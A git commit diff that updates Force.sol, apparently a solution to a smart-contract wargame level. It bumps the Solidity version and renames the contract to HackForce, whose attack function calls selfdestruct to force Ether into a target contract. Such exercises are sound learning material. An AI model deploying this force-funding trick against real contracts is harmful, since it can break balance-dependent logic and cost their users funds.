b2272560459d83afd5bfe94c9d0b94bdd1df798e
kornelHub <67650984+kornelHub@users.noreply.github.com>
2023-03-02 12:03:28 +0100

    Update Force.sol

--- Force.sol
+++ Force.sol
@@ -1,8 +1,8 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.9;
+pragma solidity 0.8.19;
 
-contract AttackForce {
-    function attack(address contractToAttack) public payable{
+contract HackForce {
+    function attack(address contractToAttack) public payable {
         selfdestruct(payable(contractToAttack)); // this is address that will recive all funds of this contract after it is destroyed
     }
 }
